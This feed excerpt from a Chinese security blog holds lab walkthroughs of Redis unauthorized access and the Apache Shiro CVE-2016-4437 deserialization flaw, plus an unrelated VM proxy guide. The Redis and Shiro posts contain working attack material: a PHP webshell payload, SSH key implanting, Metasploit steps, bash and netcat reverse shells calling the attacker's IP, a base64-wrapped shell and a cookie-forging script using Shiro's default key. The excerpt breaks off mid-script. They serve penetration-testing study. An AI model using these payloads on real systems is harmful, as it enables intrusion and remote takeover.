    <summary type="html">🥧【vulhub漏洞靶场】redis漏洞（沙盒逃逸）CVE-2022-0543漏洞原理及漏洞复现；redis漏洞（沙盒逃逸）CVE-2022-0543漏洞详情</summary>
    
    
    
    <category term="web渗透" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="笔记" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【vulhub漏洞靶场】redis漏洞及redis漏洞复现</title>
    <link href="https://blog.m3x1.cn/posts/2ab81980.html"/>
    <id>https://blog.m3x1.cn/posts/2ab81980.html</id>
    <published>2025-03-24T16:00:00.000Z</published>
    <updated>2025-03-25T04:41:39.422Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="漏洞详情">漏洞详情</h2><blockquote><p>影响版本 Redis 2.x，3.x，4.x，5.x</p></blockquote><p>Redis默认情况下，会绑定在0.0.0.0:6379(在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错)，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等等，这样将会将Redis服务暴露在公网上，如果在没有设置密码认证(默认为空)的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。</p><p>攻击者在未授权访问Redis的情况下，利用Redis自身的提供的config命令，可以进行写文件操作，攻击者还可以成功将自己的ssh公钥写入目标服务器的/root/.ssh文件的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务器登录目标服务器。</p><p>漏洞的产生条件有以下两点:</p><p>(1) Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网</p><p>(2) 没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务</p><h2 id="漏洞复现">漏洞复现</h2><blockquote><p>kali靶机： 192.168.192.132</p><p>kali攻击机：192.168.192.135</p></blockquote><h4 id="靶机设置">靶机设置</h4><p>进入vulhub靶场的redis/4-unacc目录，输入命令，然后等待加载完毕。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325085647378.png" alt="image-20250325085647378"></p><blockquote><p>小提示：如果不成功，可能是没有挂代理（懂吧？）</p></blockquote><p>输入命令查看端口是6379</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose ps</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325085748429.png" alt="image-20250325085748429"></p><p>我们用nmap扫一下靶机，也可以看到6379端口打开了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.192.132 -p 1-65535</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325090133919.png" alt="image-20250325090133919"></p><p>浏览器访问看看，能打开就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325090518098.png" alt="image-20250325090518098"></p><h4 id="攻击机设置">攻击机设置</h4><p>安装redis-cli远程连接工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br></pre></td></tr></table></figure><p>然后解压，进入该目录进行编译，等待完成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd redis-stable</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325091518998.png" alt="image-20250325091518998"></p><p>出现如上界面就说明成功了</p><h4 id="漏洞利用流程">漏洞利用流程</h4><h5 id="写入webshell">写入webshell</h5><ol><li>目标开启了web服务器,并且知道web路径(可以利用phpinfo或者错误暴路径等)</li><li>需要具有读写增删改查权</li></ol><p>用redis-cli命令远程免密登录redis主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 无密码登录命令</span><br><span class="line">redis-cli -h 目标主机IP</span><br><span class="line"># 有密码登录命令</span><br><span class="line">redis-cli -h 目标主机IP -p 端口6379 -a 登录密码</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325091905278.png" alt="image-20250325091905278"></p><p>这样就说明成功了，</p><p>redis操作命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info  #查看redis的信息和服务器信息</span><br><span class="line">flushall 删除所有数据</span><br><span class="line">del key  删除键为key的数据</span><br><span class="line">get key  获得参数key的数据</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html  #将shell移到网站默认根目录</span><br><span class="line">config set dbfilename redis.php #创建shell文件</span><br><span class="line">set webshell &quot;&lt;?php eval($_POST[1]); ?&gt;&quot;  写入一句话木马，然后蚁剑连接</span><br><span class="line">或者</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php eval($_POST[1]); ?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>由于靶机没有开启web服务，所以就不演示了。</p><h5 id="使用py脚本执行远程命令">使用py脚本执行远程命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/redis-rogue-getshell.git</span><br><span class="line">cd redis-rogue-getshell/RedisModulesSDK/exp</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325094921511.png" alt="image-20250325094921511"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ../../   #回到redis-rogue-getshell目录下</span><br><span class="line">./redis-master.py -r 192.168.239.128 -p 6379 -L 192.168.239.128 -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</span><br><span class="line">(第一个ip是靶机，第二个ip是攻击机,-c后面跟执行的命令)</span><br></pre></td></tr></table></figure><h5 id="ssh公私钥免密登录">ssh公私钥免密登录</h5><h6 id="原理">原理</h6><p>登陆linux有几种方式，最常用的是密码登陆和RSA key 登陆，RSA key登陆是生成一个公私对应的秘钥，然后将公钥放到linux系统的/root/.ssh/authorized_keys的文件中，我们本地客户端通过导入对应私钥进行登陆，这就是RSA key的登陆方式。</p><h6 id="为什么redis可以获取服务器的root权限呢？">为什么redis可以获取服务器的root权限呢？</h6><p>上面RSA key的登陆方式在服务器方面是要将公钥写入authorized_keys文件中的，而redis有一种持久化方式是生成RDB文件，通过持久化将公钥写入root下的authored_keys文件里，这样就将非法的公钥写到了验证文件里，后面我们拿对应私钥登陆即可。（但是这种方式需要redis是root启动的情况下使用，因为非root权限无法进入/root目录）</p><h6 id="步骤">步骤</h6><p>在攻击机中生成ssh公钥和私钥文件，密码为空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>进入/home/kali/.ssh目录: 将生成的公钥保存到sshkey.txt：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; sshkey.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325102503591.png" alt="image-20250325102503591"></p><p>使用redis-cli -h ip命令连接靶机，把sshkey.txt写入redis中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat sshkey.txt | redis-cli -h 192.168.192.132 -x set crack</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325102811549.png" alt="image-20250325102811549"></p><p>然后用redis-cli连接靶机，然后更改目标服务器Redis备份路径为ssh公钥存放目录(默认为/root/.ssh)</p><p>此处因为靶场中的redis没有root权限，就不演示了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh</span><br></pre></td></tr></table></figure><p>设置上传公钥备份文件名为authorized_keys:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename authorized_keys</span><br></pre></td></tr></table></figure><p>然后在攻击机上使用ssh免密码登录靶机，利用私钥就能成功登入redis服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@ip</span><br></pre></td></tr></table></figure><h5 id="使用msf进行漏洞利用">使用msf进行漏洞利用</h5><p>使用searchsploit搜索redis相关漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit redis</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325104753221.png" alt="image-20250325104753221"></p><p>可以看到相关漏洞都在metasploit里</p><p>启动metasploit（注意要在root下启动，不然攻击时会报错）,然后检索redis相关exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search redis type:exploit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325105152802.png" alt="image-20250325105152802"></p><p>看到有一个cmd利用的漏洞，使用该模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/redis/redis_replication_cmd_exec</span><br></pre></td></tr></table></figure><p>然后查看需要设置的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set LHOST 192.168.192.135</span><br><span class="line">set RHOST 192.168.192.132</span><br><span class="line">set SRVHOST 192.168.192.135</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325110217792.png" alt="image-20250325110217792"></p><p>然后运行，出现如下情况就成功了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325111732432.png" alt="image-20250325111732432"></p><h5 id="反弹连接">反弹连接</h5><p>这个方法主要适用于马被杀了，或者靶机在内网之中。</p><p>常见端口监听方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">netcat：nc -lvp 7777</span><br><span class="line"></span><br><span class="line">msf：</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.37.130</span><br><span class="line">set lport 7777</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">socat：socat TCP-LISTEN:7777 - (kali系统)</span><br></pre></td></tr></table></figure><p>常见建立连接方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux bash：</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/攻击机ip/攻击机监听端口 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">netcat：</span><br><span class="line">nc -e /bin/bash 攻击机ip 攻击机监听端口</span><br></pre></td></tr></table></figure><p>这里我就演示nc和bash的配合：</p><p>攻击机进行nc监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>靶机使用bash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.192.135/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325113528895.png" alt="image-20250325113528895"></p><p>之后在监听机上就能看到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325113511333.png" alt="image-20250325113511333"></p><p>然后就可以执行命令了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325113712853.png" alt="image-20250325113712853"></p><p>可以看到是靶机的ip地址。</p><p>主动关闭连接直接在攻击机上exit。</p>]]></content>
    
    
    <summary type="html">🥧redis漏洞原理；【vulhub漏洞靶场】redis漏洞及redis漏洞复现；利用redis写入webshell；python脚本利用redis；ssh公钥免登录利用redis；msf利用redis；反弹shell利用redis</summary>
    
    
    
    <category term="web渗透" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="笔记" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>vm虚拟机如何实现与主机共享代理实现科学上网</title>
    <link href="https://blog.m3x1.cn/posts/5892bf96.html"/>
    <id>https://blog.m3x1.cn/posts/5892bf96.html</id>
    <published>2025-03-19T16:00:00.000Z</published>
    <updated>2025-03-20T16:04:32.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="方法一：使用tun模式（推荐）">方法一：使用tun模式（推荐）</h2><p>相关文章：<a href="https://clashvmess.com/3841.html">深度解析clash开tun模式：配置与使用指南 - Clash最新教程</a></p><p>如果主机是使用代理软件走代理的话，比如clash， 可以直接使用Tun模式。Tun模式下，代理软件会创建一个虚拟网卡，主机上的进程（包括虚拟机）的网络请求都会重定向到这个虚拟网卡。这种模式拦截了所有进程的网络请求，有些进程并不遵守系统代理，比如终端, pip, docker等等，Tun模式专治这种。</p><h2 id="方法二：使用系统代理模式">方法二：使用系统代理模式</h2><p><strong>很麻烦，推荐第一种</strong></p><p>VM软件配置<br>1.VM虚拟网络编辑器<br>打开虚拟网络编辑器（方式：编辑-&gt;虚拟网络编辑器),</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/216a0bd2ce71cea38b1f4060f7fe222d.png" alt="img"></p><p>然后点击更改设置</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b11d02909648f7584aa1ce3936623e16.png" alt="img"></p><p>2.配置VMnet8和VMnet1<br>VMnet8【子网配置】如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b4914dfc9f3dabeed102f4c586b9d7df.png" alt="img"></p><p>【NAT设置】如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0cfcf812206f19a1f412471b775de26b.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5637516b8ae4604ce33c42b7f64c5097.png" alt="img"></p><p>【DHCP设置】如下：（可以理解为虚拟机的ip范围， 不要跟上图配置的网关冲突了）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/035253150ff47c67925cfeabecb99510.png" alt="img"></p><p>【VMnet1】采用默认配置就可以了，当然你也可以按照上述vmnet8的方式修改一个容易记住的ip：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0a544c334a48ba9745ba0c480fc19e90.png" alt="img"></p><p>四、主机IP配置<br>windows进入打开设置-&gt;网络</p><p>【2024-9-18补充】【可选START  // 表示这个这个范围是可有可无的】</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7642faecf3cd6799ce2c0e73d8c90f4e.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/64d182eddb6d4b654d1a3b89f0ca5508.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/aeaecd6a90ce5b0bdbf72c3502f8f7ef.png" alt="img"></p><p>双击上述红框，然后配置如下：（这里不要跟之前的网关冲突了）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/78c1f95ff9c312d75159e9012aee7f2d.png" alt="img"></p><p>【2024-9-18补充】【可选END   // 表示这个范围是可有可无的】</p><p>代理软件要开启【Allow LAN】：（这里要记住端口, 我的是7890）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/11c1bd289cab27c99074b57b67ca05a6.png" alt="img"></p><p>然击后点：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1393a2df6b6644e3ba6a7f4a1ba42e77.png" alt="img"></p><p>记住下面的接口ip,这个ip需要在Vm虚拟机中使用， 两个都可以用</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4bec5d2c26060c002847ed712896f740.png" alt="img"></p><p>在windows终端下输入ipconfig同样可以查到：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5ab320459f15a3b4338421f1c5dfe6d6.png" alt="img"></p><p>五、虚拟机代理ip配置<br>在配置代理之前需要设置网络适配器， 我们之前配置了VMnet8，在这里可以使用。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3799988deebfaaf7cef1b13c329631da.png" alt="img"></p><p>5.1 虚拟机上用【设置】配置代理<br>用【设置】配置代理，代理设置会影响所有图形app， 比如浏览器，shell…</p><p>但是却影响不了ssh(用ssh连接虚拟机ubuntu)终端，所以在使用ssh还需要配置代理，参考第七节。</p><p>当然这种配置也影响不了很多需要单独配置代理的app, 比如conda, pip, docker等等</p><p>进入虚拟机，配置ip,如果是Ubuntu可以参考下面的配置：(注意下图的端口，要跟代理软件的端口一致)</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/05f8d947f6ccce3f08fc91b7118ddf3d.png" alt="img"></p><p>然后可以打开浏览器看外网，或者终端：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/896ca71206197898e7112c685fb5919f.png" alt="img"></p>]]></content>
    
    
    <summary type="html">🥧vm虚拟机如何实现与主机共享代理实现科学上网;软件代理使用tun模式;系统代理设置方法</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Shiro反序列化漏洞全解析及各漏洞复现【vulhub靶场】</title>
    <link href="https://blog.m3x1.cn/posts/78877ffd.html"/>
    <id>https://blog.m3x1.cn/posts/78877ffd.html</id>
    <published>2025-03-19T16:00:00.000Z</published>
    <updated>2025-03-30T12:59:13.965Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="介绍Apache-Shiro-1-2-4-反序列化漏洞（CVE-2016-4437）">介绍<strong>Apache Shiro 1.2.4</strong> 反序列化漏洞（<strong>CVE-2016-4437</strong>）</h2><p>Apache Shiro是⼀款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、</p><p>易⽤，同时也能提供健壮的安全性。</p><p>Apache Shiro 1.2.4及以前版本中，加密的⽤户信息序列化后存储在名为remember-me的Cookie</p><p>中。攻击者可以使⽤Shiro的默认密钥伪造⽤户Cookie，触发Java反序列化漏洞，进⽽在⽬标机</p><p>器上执⾏任意命令。</p><h2 id="漏洞成因">漏洞成因</h2><p>其漏洞的核⼼成因是cookie中的身份信息进⾏了AES加解密，⽤于加解密的密钥应该是绝对保密</p><p>的，但在shiro版本&lt;=1.2.24的版本中使⽤了固定的密钥。因此，验证漏洞的核⼼应该还是在于我</p><p>们（攻击者）可否获得这个AES加密的密钥，如果确实是固定的密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure><p>或者其他我们可以通过脚本⼯具爆破出来的密钥，那么shiro550漏</p><p>洞才⼀定存在。</p><h2 id="Shiro特征"><strong>Shiro</strong>特征</h2><p>⾸先应该判断⼀个⻚⾯的登录是否使⽤了shiro框架进⾏身份验证、授权、密码和会话管理。判断</p><p>⽅法在于：勾选记住密码选项后，点击登录，抓包，观察请求包中是否有rememberme字段，响</p><p>应包中是否有Set-cookie:rememberMe=deleteMe字段。类似于下图这样：</p><blockquote><p>\1. 未登录的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie⾥也没有</p><p>deleteMe字段</p><p>\2. 登录失败的话，不管有没有勾选RememberMe字段，返回包都会有 rememberMe= deleteMe</p><p>字段</p><p>\3. 不勾选RememberMe，登录成功的话，返回包set-Cookie⾥有rememberMe=deleteMe字</p><p>段。但是之后的所有请求中Cookie都不会有RememberMe字段</p><p>\4. 勾选RememberMe，登录成功的话，返回包set-Cookie⾥有rememberMe=deleteMe字段，</p><p>还会有remember 字段，之后的所有请求中Cookie都会有rememberMe字段</p><p>\5. 或者可以在cookie后⾯⾃⼰加⼀个rememberMe=1，看返回包有没有rememberMe=</p><p>deleteMe</p></blockquote><h2 id="漏洞环境及复现">漏洞环境及复现</h2><h3 id="CVE-2016-4437（shiro550反序列化漏洞）">CVE-2016-4437（shiro550反序列化漏洞）</h3><p>靶机开启环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 下载项⽬</span><br><span class="line"></span><br><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub</span><br><span class="line"></span><br><span class="line">master.zip</span><br><span class="line"></span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line"></span><br><span class="line">cd vulhub-master</span><br><span class="line"></span><br><span class="line"># 进⼊某⼀个漏洞/环境的⽬录</span><br><span class="line"></span><br><span class="line">cd shiro/CVE-2016-4437</span><br><span class="line"></span><br><span class="line"># 启动环境</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">#启动容器</span><br><span class="line">docker run vulhub/shiro:1.2.4</span><br></pre></td></tr></table></figure><p>攻击机访问靶机ip:8080端口，出现如下界面就说明搭建成功</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330170402576.png" alt="image-20250330170402576"></p><p>进行漏洞复现之前，应该先验证漏洞是否存在。那么首先应该判断一个页面的登录是否使用了shiro框架进行身份验证、授权、密码和会话管理。判断方法在于：勾选记住密码选项后，点击登录，抓包，观察请求包中是否有rememberme字段，响应包中是否有Set-cookie:rememberMe=deleteMe字段。类似于下图这样：<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330170750820.png" alt="image-20250330170750820"></p><p><strong>如果出现rememberMe=deleteMe字段是仅仅能说明登录页面采用了shiro进行了身份验证而已，并非直接就说明存在漏洞</strong>。其漏洞验证流程类似判断请求和响应包的字段，应该验证上述的shiro特征。</p><h4 id="构造cookie获取反弹shell">构造cookie获取反弹shell</h4><blockquote><p>kali靶机：192.168.192.132</p><p>kali攻击机：192.168.192.133</p></blockquote><h5 id="step1-开启端口监听">step1:开启端口监听</h5><p>首先我们在攻击机开启一个端口，用于接收反弹shell，我这里开启6666端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc –lvp 6666</span><br></pre></td></tr></table></figure><h5 id="step2-攻击机搭建VPS服务，存放反弹shell的payload1">step2:攻击机搭建VPS服务，存放反弹shell的payload1</h5><p>反弹shell的命令如下（别忘了把ip改为攻击机的ip）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.192.133/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>当命令中包含重定向 ’ &lt; ’ ’ &gt; ’ 和管道符 ’ | ’ 时，需要进行 base64 编码绕过检测。可以使用在线网站对命令进行编码，网址为：<a href="https://ares-x.com/tools/runtime-exec">Runtime.exec Payload Generater | AresX’s Blog</a></p><p>如下图，我们对反弹shell的命令进行base64编码：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250330173541925.png" alt="image-20250330173541925"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Mi4xMzMvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>接下来我们利用序列化工具ysoserial.jar（工具下载我会在文末给出）生成payload，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Mi4xMzMvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p>这段命令中“”中的部分是刚才生成的反弹shell的base64编码。</p><p><strong>由于未知原因，这一部我复现总是报错，找原因也没找到，所以未复现成功，以下是看的别人的复现过程（<a href="https://blog.csdn.net/Bossfrank/article/details/130173880">shiro550反序列化漏洞原理与漏洞复现（基于vulhub，保姆级的详细教程）_shiro550原理-CSDN博客</a>）：</strong></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6032bb976fc6041b40f5d8c31416571e.png" alt="img"></p><p>对这段命令做个简要的解释：这里我们相当于在攻击机上启动了一个VPS服务，监听6666端口，然后在这个服务上放了一个反弹shell的payload，并用序列化工具ysoserial指定 CommonsCollections5 利用链生成可执行bash -i &gt;&amp; /dev/tcp/192.168.192.133/6666 0&gt;&amp;1命令的序列化数据payload1。当后面有客户端请求服务时，我们搭建的这个JRMP就会返回这段payload1。</p><p>至于为什么是CommonsCollections5 ，这是因为靶场的 shiro 存在 commons-collections 3.2.1 依赖， 是一个版本问题。</p><h5 id="step3-生成AES加密-Base64编码后的rememberMe字段">step3:生成AES加密=&gt;Base64编码后的rememberMe字段</h5><p>我们企图让存在漏洞的页面去请求我们攻击机的VPS服务，即对192.168.192.133:7777进行请求，因此，我们要用脚本对192.168.192.133:7777进行AES加密=&gt;Base64编码。</p><p>脚本shiro.py代码如下（注意这是一段python2的代码）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen = subprocess.Popen([&#x27;java&#x27;, &#x27;-jar&#x27;, &#x27;ysoserial.jar&#x27;, &#x27;JRMPClient&#x27;, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    payload = encode_rememberme(sys.argv[1])   </span><br><span class="line">print 